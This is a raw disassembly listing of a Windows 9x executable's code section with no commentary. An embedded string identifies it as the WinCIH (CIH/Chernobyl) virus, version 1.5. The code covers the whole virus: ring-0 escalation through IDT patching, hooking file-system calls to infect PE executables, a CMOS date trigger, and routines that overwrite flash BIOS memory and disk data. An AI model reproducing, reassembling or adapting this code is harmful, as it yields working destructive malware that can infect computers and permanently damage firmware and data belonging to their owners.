                           .text:00401000 c3                               ret    
                           .text:00401001 00 00                            add    %al,(%eax)
                           .text:00401003 00 00                            add    %al,(%eax)
                           .text:00401005 00 00                            add    %al,(%eax)
                           .text:00401007 00 00                            add    %al,(%eax)
                           .text:00401009 00 00                            add    %al,(%eax)
                           .text:0040100b 00 26                            add    %ah,(%esi)
                           .text:0040100d 04 00                            add    $0x0,%al
                           .text:0040100f 00 55 8d                         add    %dl,-0x73(%ebp)
                           .text:00401012 44                               inc    %esp
                           .text:00401013 24 f8                            and    $0xf8,%al
                           .text:00401015 33 db                            xor    %ebx,%ebx
                           .text:00401017 64 87 03                         xchg   %eax,%fs:(%ebx)
                           .text:0040101a e8 00 00 00 00                   call   0x0040101f
                           .text:0040101f 5b                               pop    %ebx
                           .text:00401020 8d 4b 44                         lea    0x44(%ebx),%ecx
                           .text:00401023 51                               push   %ecx
                           .text:00401024 50                               push   %eax
                           .text:00401025 50                               push   %eax
                           .text:00401026 0f 01 4c 24 fe                   sidtl  -0x2(%esp)
                           .text:0040102b 5b                               pop    %ebx
                           .text:0040102c 83 c3 34                         add    $0x34,%ebx
                           .text:0040102f fa                               cli    
                           .text:00401030 8b 2b                            mov    (%ebx),%ebp
                           .text:00401032 66 8b 6b fc                      mov    -0x4(%ebx),%bp
                           .text:00401036 8d 71 12                         lea    0x12(%ecx),%esi
                           .text:00401039 56                               push   %esi
                           .text:0040103a 66 89 73 fc                      mov    %si,-0x4(%ebx)
                           .text:0040103e c1 ee 10                         shr    $0x10,%esi
                           .text:00401041 66 89 73 02                      mov    %si,0x2(%ebx)
                           .text:00401045 5e                               pop    %esi
                           .text:00401046 cd 06                            int    $0x6
                           .text:00401048 56                               push   %esi
                           .text:00401049 8b f0                            mov    %eax,%esi
                           .text:0040104b 8b 48 fc                         mov    -0x4(%eax),%ecx
                           .text:0040104e f3 a4                            rep movsb %ds:(%esi),%es:(%edi)
                           .text:00401050 83 e8 08                         sub    $0x8,%eax
                           .text:00401053 8b 30                            mov    (%eax),%esi
                           .text:00401055 0b f6                            or     %esi,%esi
                           .text:00401057 74 02                            je     0x0040105b
                           .text:00401059 eb f0                            jmp    0x0040104b
                           .text:0040105b 5e                               pop    %esi
                           .text:0040105c cd 06                            int    $0x6
                           .text:0040105e fb                               sti    
                           .text:0040105f 33 db                            xor    %ebx,%ebx
                           .text:00401061 eb 07                            jmp    0x0040106a
                           .text:00401063 33 db                            xor    %ebx,%ebx
                           .text:00401065 64 8b 03                         mov    %fs:(%ebx),%eax
                           .text:00401068 8b 20                            mov    (%eax),%esp
                           .text:0040106a 64 8f 03                         popl   %fs:(%ebx)
                           .text:0040106d 58                               pop    %eax
                           .text:0040106e 5d                               pop    %ebp
                           .text:0040106f 68 00 10 40 00                   push   $0x401000
                           .text:00401074 c3                               ret    
                           .text:00401075 74 32                            je     0x004010a9
                           .text:00401077 0f 21 c1                         mov    %db0,%ecx
                           .text:0040107a e3 10                            jecxz  0x0040108c
                           .text:0040107c 83 04 24 16                      addl   $0x16,(%esp)
                           .text:00401080 66 89 6b fc                      mov    %bp,-0x4(%ebx)
                           .text:00401084 c1 ed 10                         shr    $0x10,%ebp
                           .text:00401087 66 89 6b 02                      mov    %bp,0x2(%ebx)
                           .text:0040108b cf                               iret   
                           .text:0040108c 0f 23 c3                         mov    %ebx,%db0
                           .text:0040108f 6a 0f                            push   $0xf
                           .text:00401091 51                               push   %ecx
                           .text:00401092 6a ff                            push   $0xffffffff
                           .text:00401094 51                               push   %ecx
                           .text:00401095 51                               push   %ecx
                           .text:00401096 51                               push   %ecx
                           .text:00401097 6a 01                            push   $0x1
                           .text:00401099 6a 02                            push   $0x2
                           .text:0040109b cd 20                            int    $0x20
                           .text:0040109d 53                               push   %ebx
                           .text:0040109e 00 01                            add    %al,(%ecx)
                           .text:004010a0 00 83 c4 20 97 8d                add    %al,-0x7268df3c(%ebx)
                           .text:004010a6 46                               inc    %esi
                           .text:004010a7 9b                               fwait
                           .text:004010a8 cf                               iret   
                           .text:004010a9 8d 87 be fc ff ff                lea    -0x342(%edi),%eax
                           .text:004010af 50                               push   %eax
                           .text:004010b0 cd 20                            int    $0x20
                           .text:004010b2 67 00 40 00                      add    %al,0x0(%bx,%si)
                           .text:004010b6 0f 23 c0                         mov    %eax,%db0
                           .text:004010b9 58                               pop    %eax
                           .text:004010ba 8b 4e 3d                         mov    0x3d(%esi),%ecx
                           .text:004010bd 8b 11                            mov    (%ecx),%edx
                           .text:004010bf 89 50 fc                         mov    %edx,-0x4(%eax)
                           .text:004010c2 8d 40 d6                         lea    -0x2a(%eax),%eax
                           .text:004010c5 89 01                            mov    %eax,(%ecx)
                           .text:004010c7 fa                               cli    
                           .text:004010c8 eb b6                            jmp    0x00401080
                           .text:004010ca 53                               push   %ebx
                           .text:004010cb e8 00 00 00 00                   call   0x004010d0
                           .text:004010d0 5b                               pop    %ebx
                           .text:004010d1 83 c3 24                         add    $0x24,%ebx
                           .text:004010d4 53                               push   %ebx
                           .text:004010d5 cd 20                            int    $0x20
                           .text:004010d7 68 00 40 00 58                   push   $0x58004000
                           .text:004010dc ff 74 24 08                      pushl  0x8(%esp)
                           .text:004010e0 ff 53 fc                         call   *-0x4(%ebx)
                           .text:004010e3 59                               pop    %ecx
                           .text:004010e4 50                               push   %eax
                           .text:004010e5 53                               push   %ebx
                           .text:004010e6 ff 53 fc                         call   *-0x4(%ebx)
                           .text:004010e9 59                               pop    %ecx
                           .text:004010ea 0f 23 c0                         mov    %eax,%db0
                           .text:004010ed 58                               pop    %eax
                           .text:004010ee 5b                               pop    %ebx
                           .text:004010ef c3                               ret    
                           .text:004010f0 00 00                            add    %al,(%eax)
                           .text:004010f2 00 00                            add    %al,(%eax)
                           .text:004010f4 60                               pusha  
                           .text:004010f5 e8 00 00 00 00                   call   0x004010fa
                           .text:004010fa 5e                               pop    %esi
                           .text:004010fb 81 c6 3c 03 00 00                add    $0x33c,%esi
                           .text:00401101 f6 06 01                         testb  $0x1,(%esi)
                           .text:00401104 0f 85 1e 02 00 00                jne    0x00401328
                           .text:0040110a 8d 5c 24 28                      lea    0x28(%esp),%ebx
                           .text:0040110e 83 3b 24                         cmpl   $0x24,(%ebx)
                           .text:00401111 0f 85 0b 02 00 00                jne    0x00401322
                           .text:00401117 fe 06                            incb   (%esi)
                           .text:00401119 83 c6 05                         add    $0x5,%esi
                           .text:0040111c 56                               push   %esi
                           .text:0040111d 8a 43 04                         mov    0x4(%ebx),%al
                           .text:00401120 3c ff                            cmp    $0xff,%al
                           .text:00401122 74 08                            je     0x0040112c
                           .text:00401124 04 40                            add    $0x40,%al
                           .text:00401126 b4 3a                            mov    $0x3a,%ah
                           .text:00401128 89 06                            mov    %eax,(%esi)
                           .text:0040112a 46                               inc    %esi
                           .text:0040112b 46                               inc    %esi
                           .text:0040112c 6a 00                            push   $0x0
                           .text:0040112e 6a 7f                            push   $0x7f
                           .text:00401130 8b 5b 10                         mov    0x10(%ebx),%ebx
                           .text:00401133 8b 43 0c                         mov    0xc(%ebx),%eax
                           .text:00401136 83 c0 04                         add    $0x4,%eax
                           .text:00401139 50                               push   %eax
                           .text:0040113a 56                               push   %esi
                           .text:0040113b cd 20                            int    $0x20
                           .text:0040113d 41                               inc    %ecx
                           .text:0040113e 00 40 00                         add    %al,0x0(%eax)
                           .text:00401141 83 c4 10                         add    $0x10,%esp
                           .text:00401144 81 7c 06 fc 2e 45 58 45          cmpl   $0x4558452e,-0x4(%esi,%eax,1)
                           .text:0040114c 5e                               pop    %esi
                           .text:0040114d 0f 85 cc 01 00 00                jne    0x0040131f
                           .text:00401153 81 7c 06 fa 46 55 43 4b          cmpl   $0x4b435546,-0x6(%esi,%eax,1)
                           .text:0040115b 0f 85 be 01 00 00                jne    0x0040131f
                           .text:00401161 66 83 7b 18 01                   cmpw   $0x1,0x18(%ebx)
                           .text:00401166 0f 85 b3 01 00 00                jne    0x0040131f
                           .text:0040116c 66 b8 00 43                      mov    $0x4300,%ax
                           .text:00401170 cd 20                            int    $0x20
                           .text:00401172 32 00                            xor    (%eax),%al
                           .text:00401174 40                               inc    %eax
                           .text:00401175 00 0f                            add    %cl,(%edi)
                           .text:00401177 82                               (bad)  
                           .text:00401178 a3 01 00 00 51                   mov    %eax,0x51000001
                           .text:0040117d 8b be 37 fd ff ff                mov    -0x2c9(%esi),%edi
                           .text:00401183 8b 3f                            mov    (%edi),%edi
                           .text:00401185 f6 c1 01                         test   $0x1,%cl
                           .text:00401188 74 08                            je     0x00401192
                           .text:0040118a 66 b8 01 43                      mov    $0x4301,%ax
                           .text:0040118e 33 c9                            xor    %ecx,%ecx
                           .text:00401190 ff d7                            call   *%edi
                           .text:00401192 33 c0                            xor    %eax,%eax
                           .text:00401194 b4 d5                            mov    $0xd5,%ah
                           .text:00401196 33 c9                            xor    %ecx,%ecx
                           .text:00401198 33 d2                            xor    %edx,%edx
                           .text:0040119a 42                               inc    %edx
                           .text:0040119b 8b da                            mov    %edx,%ebx
                           .text:0040119d 43                               inc    %ebx
                           .text:0040119e ff d7                            call   *%edi
                           .text:004011a0 93                               xchg   %eax,%ebx
                           .text:004011a1 59                               pop    %ecx
                           .text:004011a2 9c                               pushf  
                           .text:004011a3 f6 c1 01                         test   $0x1,%cl
                           .text:004011a6 74 06                            je     0x004011ae
                           .text:004011a8 66 b8 01 43                      mov    $0x4301,%ax
                           .text:004011ac ff d7                            call   *%edi
                           .text:004011ae 9d                               popf   
                           .text:004011af 0f 82 6a 01 00 00                jb     0x0040131f
                           .text:004011b5 56                               push   %esi
                           .text:004011b6 9c                               pushf  
                           .text:004011b7 83 c6 7f                         add    $0x7f,%esi
                           .text:004011ba 33 c0                            xor    %eax,%eax
                           .text:004011bc b4 d6                            mov    $0xd6,%ah
                           .text:004011be 8b e8                            mov    %eax,%ebp
                           .text:004011c0 6a 04                            push   $0x4
                           .text:004011c2 59                               pop    %ecx
                           .text:004011c3 6a 3c                            push   $0x3c
                           .text:004011c5 5a                               pop    %edx
                           .text:004011c6 ff d7                            call   *%edi
                           .text:004011c8 8b 16                            mov    (%esi),%edx
                           .text:004011ca 4a                               dec    %edx
                           .text:004011cb 8b c5                            mov    %ebp,%eax
                           .text:004011cd ff d7                            call   *%edi
                           .text:004011cf 81 3e 00 50 45 00                cmpl   $0x455000,(%esi)
                           .text:004011d5 0f 85 2c 01 00 00                jne    0x00401307
                           .text:004011db 53                               push   %ebx
                           .text:004011dc 6a 00                            push   $0x0
                           .text:004011de 6a 01                            push   $0x1
                           .text:004011e0 52                               push   %edx
                           .text:004011e1 57                               push   %edi
                           .text:004011e2 0f 23 cc                         mov    %esp,%db1
                           .text:004011e5 50                               push   %eax
                           .text:004011e6 8b c5                            mov    %ebp,%eax
                           .text:004011e8 b1 52                            mov    $0x52,%cl
                           .text:004011ea 83 c2 07                         add    $0x7,%edx
                           .text:004011ed ff d7                            call   *%edi
                           .text:004011ef 8d 42 22                         lea    0x22(%edx),%eax
                           .text:004011f2 50                               push   %eax
                           .text:004011f3 8d 06                            lea    (%esi),%eax
                           .text:004011f5 50                               push   %eax
                           .text:004011f6 0f b7 46 0e                      movzwl 0xe(%esi),%eax
                           .text:004011fa 8d 54 10 12                      lea    0x12(%eax,%edx,1),%edx
                           .text:004011fe b0 28                            mov    $0x28,%al
                           .text:00401200 8a 0e                            mov    (%esi),%cl
                           .text:00401202 f6 e1                            mul    %cl
                           .text:00401204 8d 76 32                         lea    0x32(%esi),%esi
                           .text:00401207 50                               push   %eax
                           .text:00401208 52                               push   %edx
                           .text:00401209 56                               push   %esi
                           .text:0040120a 41                               inc    %ecx
                           .text:0040120b 51                               push   %ecx
                           .text:0040120c c1 e1 03                         shl    $0x3,%ecx
                           .text:0040120f 51                               push   %ecx
                           .text:00401210 03 c8                            add    %eax,%ecx
                           .text:00401212 03 ca                            add    %edx,%ecx
                           .text:00401214 2b 4e 1c                         sub    0x1c(%esi),%ecx
                           .text:00401217 f7 d1                            not    %ecx
                           .text:00401219 41                               inc    %ecx
                           .text:0040121a 51                               push   %ecx
                           .text:0040121b 91                               xchg   %eax,%ecx
                           .text:0040121c 8b 46 f0                         mov    -0x10(%esi),%eax
                           .text:0040121f 03 46 fc                         add    -0x4(%esi),%eax
                           .text:00401222 89 86 84 fb ff ff                mov    %eax,-0x47c(%esi)
                           .text:00401228 66 81 3c 24 ba 00                cmpw   $0xba,(%esp)
                           .text:0040122e 0f 8c 7f 00 00 00                jl     0x004012b3
                           .text:00401234 8b c5                            mov    %ebp,%eax
                           .text:00401236 ff d7                            call   *%edi
                           .text:00401238 95                               xchg   %eax,%ebp
                           .text:00401239 6a 04                            push   $0x4
                           .text:0040123b 59                               pop    %ecx
                           .text:0040123c 52                               push   %edx
                           .text:0040123d 8b 56 3c                         mov    0x3c(%esi),%edx
                           .text:00401240 83 c2 12                         add    $0x12,%edx
                           .text:00401243 ff d7                            call   *%edi
                           .text:00401245 81 3e 6e 5a 69 70                cmpl   $0x70695a6e,(%esi)
                           .text:0040124b 74 6b                            je     0x004012b8
                           .text:0040124d 90                               nop
                           .text:0040124e 90                               nop
                           .text:0040124f 90                               nop
                           .text:00401250 90                               nop
                           .text:00401251 5a                               pop    %edx
                           .text:00401252 5b                               pop    %ebx
                           .text:00401253 5f                               pop    %edi
                           .text:00401254 59                               pop    %ecx
                           .text:00401255 57                               push   %edi
                           .text:00401256 03 d5                            add    %ebp,%edx
                           .text:00401258 52                               push   %edx
                           .text:00401259 03 ee                            add    %esi,%ebp
                           .text:0040125b 55                               push   %ebp
                           .text:0040125c 8d 44 3d fc                      lea    -0x4(%ebp,%edi,1),%eax
                           .text:00401260 89 18                            mov    %ebx,(%eax)
                           .text:00401262 53                               push   %ebx
                           .text:00401263 03 d7                            add    %edi,%edx
                           .text:00401265 52                               push   %edx
                           .text:00401266 8d be 24 fb ff ff                lea    -0x4dc(%esi),%edi
                           .text:0040126c 57                               push   %edi
                           .text:0040126d 89 56 ce                         mov    %edx,-0x32(%esi)
                           .text:00401270 8d 56 d8                         lea    -0x28(%esi),%edx
                           .text:00401273 bd 26 04 00 00                   mov    $0x426,%ebp
                           .text:00401278 eb 31                            jmp    0x004012ab
                           .text:0040127a 83 c2 28                         add    $0x28,%edx
                           .text:0040127d 8b 5a 10                         mov    0x10(%edx),%ebx
                           .text:00401280 2b 5a 08                         sub    0x8(%edx),%ebx
                           .text:00401283 76 2c                            jbe    0x004012b1
                           .text:00401285 53                               push   %ebx
                           .text:00401286 83 e8 08                         sub    $0x8,%eax
                           .text:00401289 89 18                            mov    %ebx,(%eax)
                           .text:0040128b 8b 5a 14                         mov    0x14(%edx),%ebx
                           .text:0040128e 03 5a 08                         add    0x8(%edx),%ebx
                           .text:00401291 53                               push   %ebx
                           .text:00401292 57                               push   %edi
                           .text:00401293 8b 5a 08                         mov    0x8(%edx),%ebx
                           .text:00401296 03 5a 0c                         add    0xc(%edx),%ebx
                           .text:00401299 03 5e fc                         add    -0x4(%esi),%ebx
                           .text:0040129c 89 58 04                         mov    %ebx,0x4(%eax)
                           .text:0040129f 8b 18                            mov    (%eax),%ebx
                           .text:004012a1 01 5a 08                         add    %ebx,0x8(%edx)
                           .text:004012a4 81 4a 24 40 00 00 40             orl    $0x40000040,0x24(%edx)
                           .text:004012ab 2b eb                            sub    %ebx,%ebp
                           .text:004012ad 76 0e                            jbe    0x004012bd
                           .text:004012af 03 fb                            add    %ebx,%edi
                           .text:004012b1 e2 c7                            loop   0x0040127a
                           .text:004012b3 0f 21 cc                         mov    %db1,%esp
                           .text:004012b6 eb 33                            jmp    0x004012eb
                           .text:004012b8 83 c4 3c                         add    $0x3c,%esp
                           .text:004012bb eb 4a                            jmp    0x00401307
                           .text:004012bd 01 28                            add    %ebp,(%eax)
                           .text:004012bf 01 6c 24 08                      add    %ebp,0x8(%esp)
                           .text:004012c3 33 db                            xor    %ebx,%ebx
                           .text:004012c5 89 58 fc                         mov    %ebx,-0x4(%eax)
                           .text:004012c8 8d 86 84 fc ff ff                lea    -0x37c(%esi),%eax
                           .text:004012ce b1 04                            mov    $0x4,%cl
                           .text:004012d0 66 c7 00 cd 20                   movw   $0x20cd,(%eax)
                           .text:004012d5 8b 94 8e 14 ff ff ff             mov    -0xec(%esi,%ecx,4),%edx
                           .text:004012dc 89 50 02                         mov    %edx,0x2(%eax)
                           .text:004012df 0f b6 94 31 13 ff ff ff          movzbl -0xed(%ecx,%esi,1),%edx
                           .text:004012e7 2b c2                            sub    %edx,%eax
                           .text:004012e9 e2 e5                            loop   0x004012d0
                           .text:004012eb 0f 21 c8                         mov    %db1,%eax
                           .text:004012ee 8b 58 10                         mov    0x10(%eax),%ebx
                           .text:004012f1 8b 38                            mov    (%eax),%edi
                           .text:004012f3 59                               pop    %ecx
                           .text:004012f4 e3 0d                            jecxz  0x00401303
                           .text:004012f6 8b f1                            mov    %ecx,%esi
                           .text:004012f8 b8 01 d6 00 00                   mov    $0xd601,%eax
                           .text:004012fd 5a                               pop    %edx
                           .text:004012fe 59                               pop    %ecx
                           .text:004012ff ff d7                            call   *%edi
                           .text:00401301 eb f0                            jmp    0x004012f3
                           .text:00401303 5b                               pop    %ebx
                           .text:00401304 58                               pop    %eax
                           .text:00401305 f9                               stc    
                           .text:00401306 9c                               pushf  
                           .text:00401307 33 c0                            xor    %eax,%eax
                           .text:00401309 b4 d7                            mov    $0xd7,%ah
                           .text:0040130b ff d7                            call   *%edi
                           .text:0040130d 9d                               popf   
                           .text:0040130e 5e                               pop    %esi
                           .text:0040130f 73 31                            jae    0x00401342
                           .text:00401311 8b df                            mov    %edi,%ebx
                           .text:00401313 66 b8 03 43                      mov    $0x4303,%ax
                           .text:00401317 8b 4e fc                         mov    -0x4(%esi),%ecx
                           .text:0040131a 8b 7e fe                         mov    -0x2(%esi),%edi
                           .text:0040131d ff d3                            call   *%ebx
                           .text:0040131f fe 4e fb                         decb   -0x5(%esi)
                           .text:00401322 61                               popa   
                           .text:00401323 0f 21 c0                         mov    %db0,%eax
                           .text:00401326 ff 20                            jmp    *(%eax)
                           .text:00401328 8b dc                            mov    %esp,%ebx
                           .text:0040132a ff 73 38                         pushl  0x38(%ebx)
                           .text:0040132d ff 53 24                         call   *0x24(%ebx)
                           .text:00401330 59                               pop    %ecx
                           .text:00401331 89 43 1c                         mov    %eax,0x1c(%ebx)
                           .text:00401334 83 7b 28 24                      cmpl   $0x24,0x28(%ebx)
                           .text:00401338 75 06                            jne    0x00401340
                           .text:0040133a 8b 41 28                         mov    0x28(%ecx),%eax
                           .text:0040133d 89 46 01                         mov    %eax,0x1(%esi)
                           .text:00401340 61                               popa   
                           .text:00401341 c3                               ret    
                           .text:00401342 b0 07                            mov    $0x7,%al
                           .text:00401344 e6 70                            out    %al,$0x70
                           .text:00401346 e4 71                            in     $0x71,%al
                           .text:00401348 34 01                            xor    $0x1,%al
                           .text:0040134a eb d3                            jmp    0x0040131f
                           .text:0040134c 66 bd f8 0c                      mov    $0xcf8,%bp
                           .text:00401350 8d 76 b2                         lea    -0x4e(%esi),%esi
                           .text:00401353 bf 4c 38 00 80                   mov    $0x8000384c,%edi
                           .text:00401358 66 ba fe 0c                      mov    $0xcfe,%dx
                           .text:0040135c fa                               cli    
                           .text:0040135d ff d6                            call   *%esi
                           .text:0040135f 66 bf 58 00                      mov    $0x58,%di
                           .text:00401363 4a                               dec    %edx
                           .text:00401364 66 c7 46 08 24 0f                movw   $0xf24,0x8(%esi)
                           .text:0040136a ff d6                            call   *%esi
                           .text:0040136c 8d 5e f4                         lea    -0xc(%esi),%ebx
                           .text:0040136f b8 55 55 0e 00                   mov    $0xe5555,%eax
                           .text:00401374 b9 aa 2a 0e 00                   mov    $0xe2aaa,%ecx
                           .text:00401379 ff d3                            call   *%ebx
                           .text:0040137b c6 00 60                         movb   $0x60,(%eax)
                           .text:0040137e 51                               push   %ecx
                           .text:0040137f e2 fe                            loop   0x0040137f
                           .text:00401381 32 e4                            xor    %ah,%ah
                           .text:00401383 88 00                            mov    %al,(%eax)
                           .text:00401385 91                               xchg   %eax,%ecx
                           .text:00401386 e2 fe                            loop   0x00401386
                           .text:00401388 b8 55 55 0f 00                   mov    $0xf5555,%eax
                           .text:0040138d 59                               pop    %ecx
                           .text:0040138e b5 aa                            mov    $0xaa,%ch
                           .text:00401390 ff d3                            call   *%ebx
                           .text:00401392 c6 00 20                         movb   $0x20,(%eax)
                           .text:00401395 e2 fe                            loop   0x00401395
                           .text:00401397 b4 e0                            mov    $0xe0,%ah
                           .text:00401399 88 00                            mov    %al,(%eax)
                           .text:0040139b 66 c7 46 08 0c 10                movw   $0x100c,0x8(%esi)
                           .text:004013a1 ff d6                            call   *%esi
                           .text:004013a3 33 db                            xor    %ebx,%ebx
                           .text:004013a5 b7 82                            mov    $0x82,%bh
                           .text:004013a7 53                               push   %ebx
                           .text:004013a8 83 ec 2c                         sub    $0x2c,%esp
                           .text:004013ab 68 00 10 00 c0                   push   $0xc0001000
                           .text:004013b0 b7 08                            mov    $0x8,%bh
                           .text:004013b2 53                               push   %ebx
                           .text:004013b3 51                               push   %ecx
                           .text:004013b4 51                               push   %ecx
                           .text:004013b5 51                               push   %ecx
                           .text:004013b6 68 01 05 00 40                   push   $0x40000501
                           .text:004013bb 41                               inc    %ecx
                           .text:004013bc 51                               push   %ecx
                           .text:004013bd 51                               push   %ecx
                           .text:004013be 8b f4                            mov    %esp,%esi
                           .text:004013c0 81 ec ac 00 00 00                sub    $0xac,%esp
                           .text:004013c6 cd 20                            int    $0x20
                           .text:004013c8 04 00                            add    $0x0,%al
                           .text:004013ca 10 00                            adc    %al,(%eax)
                           .text:004013cc 66 83 7e 06 17                   cmpw   $0x17,0x6(%esi)
                           .text:004013d1 74 05                            je     0x004013d8
                           .text:004013d3 fe 46 4d                         incb   0x4d(%esi)
                           .text:004013d6 eb ee                            jmp    0x004013c6
                           .text:004013d8 01 5e 10                         add    %ebx,0x10(%esi)
                           .text:004013db c6 46 4d 82                      movb   $0x82,0x4d(%esi)
                           .text:004013df eb e5                            jmp    0x004013c6
                           .text:004013e1 88 08                            mov    %cl,(%eax)
                           .text:004013e3 88 01                            mov    %al,(%ecx)
                           .text:004013e5 c6 00 80                         movb   $0x80,(%eax)
                           .text:004013e8 88 08                            mov    %cl,(%eax)
                           .text:004013ea 88 01                            mov    %al,(%ecx)
                           .text:004013ec c3                               ret    
                           .text:004013ed 97                               xchg   %eax,%edi
                           .text:004013ee 87 d5                            xchg   %edx,%ebp
                           .text:004013f0 ef                               out    %eax,(%dx)
                           .text:004013f1 97                               xchg   %eax,%edi
                           .text:004013f2 87 d5                            xchg   %edx,%ebp
                           .text:004013f4 ec                               in     (%dx),%al
                           .text:004013f5 0c 44                            or     $0x44,%al
                           .text:004013f7 97                               xchg   %eax,%edi
                           .text:004013f8 87 d5                            xchg   %edx,%ebp
                           .text:004013fa ef                               out    %eax,(%dx)
                           .text:004013fb 97                               xchg   %eax,%edi
                           .text:004013fc 87 d5                            xchg   %edx,%ebp
                           .text:004013fe ee                               out    %al,(%dx)
                           .text:004013ff c3                               ret    
                           .text:00401400 00 3a                            add    %bh,(%edx)
                           .text:00401402 66 35 53 00                      xor    $0x53,%ax
                           .text:00401406 01 00                            add    %eax,(%eax)
                           .text:00401408 68 00 40 00 41                   push   $0x41004000
                           .text:0040140d 00 40 00                         add    %al,0x0(%eax)
                           .text:00401410 32 00                            xor    (%eax),%al
                           .text:00401412 40                               inc    %eax
                           .text:00401413 00 57 69                         add    %dl,0x69(%edi)
                           .text:00401416 6e                               outsb  %ds:(%esi),(%dx)
                           .text:00401417 43                               inc    %ebx
                           .text:00401418 49                               dec    %ecx
                           .text:00401419 48                               dec    %eax
                           .text:0040141a 20 76 65                         and    %dh,0x65(%esi)
                           .text:0040141d 72 20                            jb     0x0040143f
                           .text:0040141f 31 2e                            xor    %ebp,(%esi)
                           .text:00401421 35 20 62 79 20                   xor    $0x20796220,%eax
                           .text:00401426 54                               push   %esp
                           .text:00401427 41                               inc    %ecx
                           .text:00401428 54                               push   %esp
                           .text:00401429 55                               push   %ebp
                           .text:0040142a 4e                               dec    %esi
                           .text:0040142b 47                               inc    %edi
                           .text:0040142c 2c 20                            sub    $0x20,%al
                           .text:0040142e 54                               push   %esp
                           .text:0040142f 68 61 69 6c 61                   push   $0x616c6961
                           .text:00401434 6e                               outsb  %ds:(%esi),(%dx)
                           .text:00401435 64 00 00                         add    %al,%fs:(%eax)
                           .text:00401438 00 00                            add    %al,(%eax)
                           .text:0040143a 00 00                            add    %al,(%eax)
                           .text:0040143c 00 00                            add    %al,(%eax)
                           .text:0040143e 00 00                            add    %al,(%eax)
                           .text:00401440 00 00                            add    %al,(%eax)
                           .text:00401442 00 00                            add    %al,(%eax)
                           .text:00401444 00 00                            add    %al,(%eax)
                           .text:00401446 00 00                            add    %al,(%eax)
                           .text:00401448 00 00                            add    %al,(%eax)
                           .text:0040144a 00 00                            add    %al,(%eax)
                           .text:0040144c 00 00                            add    %al,(%eax)
                           .text:0040144e 00 00                            add    %al,(%eax)
                           .text:00401450 00 00                            add    %al,(%eax)
                           .text:00401452 00 00                            add    %al,(%eax)
                           .text:00401454 00 00                            add    %al,(%eax)
                           .text:00401456 00 00                            add    %al,(%eax)
                           .text:00401458 00 00                            add    %al,(%eax)
                           .text:0040145a 00 00                            add    %al,(%eax)
                           .text:0040145c 00 00                            add    %al,(%eax)
                           .text:0040145e 00 00                            add    %al,(%eax)
                           .text:00401460 00 00                            add    %al,(%eax)
                           .text:00401462 00 00                            add    %al,(%eax)
                           .text:00401464 00 00                            add    %al,(%eax)
                           .text:00401466 00 00                            add    %al,(%eax)
                           .text:00401468 00 00                            add    %al,(%eax)
                           .text:0040146a 00 00                            add    %al,(%eax)
                           .text:0040146c 00 00                            add    %al,(%eax)
                           .text:0040146e 00 00                            add    %al,(%eax)
                           .text:00401470 00 00                            add    %al,(%eax)
                           .text:00401472 00 00                            add    %al,(%eax)
                           .text:00401474 00 00                            add    %al,(%eax)
                           .text:00401476 00 00                            add    %al,(%eax)
                           .text:00401478 00 00                            add    %al,(%eax)
                           .text:0040147a 00 00                            add    %al,(%eax)
                           .text:0040147c 00 00                            add    %al,(%eax)
                           .text:0040147e 00 00                            add    %al,(%eax)
                           .text:00401480 00 00                            add    %al,(%eax)
                           .text:00401482 00 00                            add    %al,(%eax)
                           .text:00401484 00 00                            add    %al,(%eax)
                           .text:00401486 00 00                            add    %al,(%eax)
                           .text:00401488 00 00                            add    %al,(%eax)
                           .text:0040148a 00 00                            add    %al,(%eax)
                           .text:0040148c 00 00                            add    %al,(%eax)
                           .text:0040148e 00 00                            add    %al,(%eax)
                           .text:00401490 00 00                            add    %al,(%eax)
                           .text:00401492 00 00                            add    %al,(%eax)
                           .text:00401494 00 00                            add    %al,(%eax)
                           .text:00401496 00 00                            add    %al,(%eax)
                           .text:00401498 00 00                            add    %al,(%eax)
                           .text:0040149a 00 00                            add    %al,(%eax)
                           .text:0040149c 00 00                            add    %al,(%eax)
                           .text:0040149e 00 00                            add    %al,(%eax)
                           .text:004014a0 00 00                            add    %al,(%eax)
                           .text:004014a2 00 00                            add    %al,(%eax)
                           .text:004014a4 00 00                            add    %al,(%eax)
                           .text:004014a6 00 00                            add    %al,(%eax)
                           .text:004014a8 00 00                            add    %al,(%eax)
                           .text:004014aa 00 00                            add    %al,(%eax)
                           .text:004014ac 00 00                            add    %al,(%eax)
                           .text:004014ae 00 00                            add    %al,(%eax)
                           .text:004014b0 00 00                            add    %al,(%eax)
                           .text:004014b2 00 00                            add    %al,(%eax)
                           .text:004014b4 00 00                            add    %al,(%eax)
                           .text:004014b6 00 00                            add    %al,(%eax)
                           .text:004014b8 00 00                            add    %al,(%eax)
                           .text:004014ba 00 00                            add    %al,(%eax)
                           .text:004014bc 00 00                            add    %al,(%eax)
                           .text:004014be 00 00                            add    %al,(%eax)
                           .text:004014c0 00 00                            add    %al,(%eax)
                           .text:004014c2 00 00                            add    %al,(%eax)
                           .text:004014c4 00 00                            add    %al,(%eax)
                           .text:004014c6 00 00                            add    %al,(%eax)
                           .text:004014c8 00 00                            add    %al,(%eax)
                           .text:004014ca 00 00                            add    %al,(%eax)
                           .text:004014cc 00 00                            add    %al,(%eax)
                           .text:004014ce 00 00                            add    %al,(%eax)
                           .text:004014d0 00 00                            add    %al,(%eax)
                           .text:004014d2 00 00                            add    %al,(%eax)
                           .text:004014d4 00 00                            add    %al,(%eax)
                           .text:004014d6 00 00                            add    %al,(%eax)
                           .text:004014d8 00 00                            add    %al,(%eax)
                           .text:004014da 00 00                            add    %al,(%eax)
                           .text:004014dc 00 00                            add    %al,(%eax)
                           .text:004014de 00 00                            add    %al,(%eax)
                           .text:004014e0 00 00                            add    %al,(%eax)
                           .text:004014e2 00 00                            add    %al,(%eax)
                           .text:004014e4 00 00                            add    %al,(%eax)
                           .text:004014e6 00 00                            add    %al,(%eax)
                           .text:004014e8 00 00                            add    %al,(%eax)
                           .text:004014ea 00 00                            add    %al,(%eax)
                           .text:004014ec 00 00                            add    %al,(%eax)
                           .text:004014ee 00 00                            add    %al,(%eax)
                           .text:004014f0 00 00                            add    %al,(%eax)
                           .text:004014f2 00 00                            add    %al,(%eax)
                           .text:004014f4 00 00                            add    %al,(%eax)
                           .text:004014f6 00 00                            add    %al,(%eax)
                           .text:004014f8 00 00                            add    %al,(%eax)
                           .text:004014fa 00 00                            add    %al,(%eax)
                           .text:004014fc 00 00                            add    %al,(%eax)
                           .text:004014fe 00 00                            add    %al,(%eax)
                           .text:00401500 00 00                            add    %al,(%eax)
                           .text:00401502 00 00                            add    %al,(%eax)
                           .text:00401504 00 00                            add    %al,(%eax)
